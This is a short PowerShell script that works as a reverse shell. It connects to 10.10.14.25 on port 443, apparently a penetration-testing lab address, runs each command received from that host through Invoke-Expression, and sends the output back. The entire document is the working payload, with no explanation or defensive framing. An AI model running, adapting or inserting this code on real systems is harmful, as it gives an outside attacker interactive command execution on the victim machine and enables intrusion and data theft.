$lhost="10.10.14.25";
$lport=443;
$MAXCMDLENGTH=65535;
$client = New-Object System.Net.Sockets.TCPClient($lhost, $lport);
$stream = $client.GetStream();
$bytes = (New-Object byte[] $MAXCMDLENGTH);
$out = ([text.encoding]::ASCII).GetBytes("PS $($pwd.Path)> ");
$stream.Write($out, 0, $out.Length);
while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
    $in = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);
    try {
        $out = (iex $in 2>&1 | Out-String);
    }
    catch {
        $out = ($_ | Out-String);
    }
    $out = "$($out)PS $($pwd.Path)> ";
    $out = ([Text.Encoding]::ASCII).GetBytes($out);
    $stream.Write($out, 0, $out.Length);
    $stream.Flush();
}
$client.Close();
